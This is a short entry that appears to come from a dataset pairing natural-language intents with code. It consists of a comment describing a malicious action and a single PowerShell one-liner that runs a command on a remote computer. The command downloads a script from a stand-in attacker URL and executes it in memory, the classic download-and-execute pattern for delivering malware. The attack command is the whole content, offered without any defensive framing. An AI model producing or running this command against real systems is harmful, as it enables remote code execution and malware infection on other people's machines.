# Natural language intent:
# Invokes a command on a remote computer to download and execute a malicious script from a specified URL.

Invoke-Command -ComputerName <Target> -ScriptBlock { Invoke-Expression (New-Object Net.WebClient).DownloadString('http://hacker.com/malware/exploit')}
